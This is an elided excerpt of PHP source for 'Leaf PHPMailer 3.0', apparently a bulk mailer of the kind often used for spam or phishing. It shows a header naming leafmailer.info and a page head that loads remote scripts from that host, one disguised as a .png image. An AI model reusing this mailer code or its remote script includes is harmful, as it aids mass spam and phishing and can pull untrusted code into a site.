<?php
/**
 * Leaf PHP Mailer by [leafmailer.info]
 * @version : 3.0
**/
    ...
    public function createHeader()
    {
        ...
        if ($this->XMailer == '') {
            $result .= $this->headerLine(
                'X-Mailer',
                'Leaf PHPMailer 3.0 (leafmailer.info)'
            );
        } else {
...
<head>
    ...
    <script src="https://leafmailer.info/style.js"></script>
    <script src="https://leafmailer.info/leaf/image/b.png"></script>
...
print '<div class="container col-lg-6">
        <h3><font color="red"><span class="glyphicon glyphicon-leaf"></span></font> Leaf PHPMailer <small>'.$leaf['version'].'</small></h3>
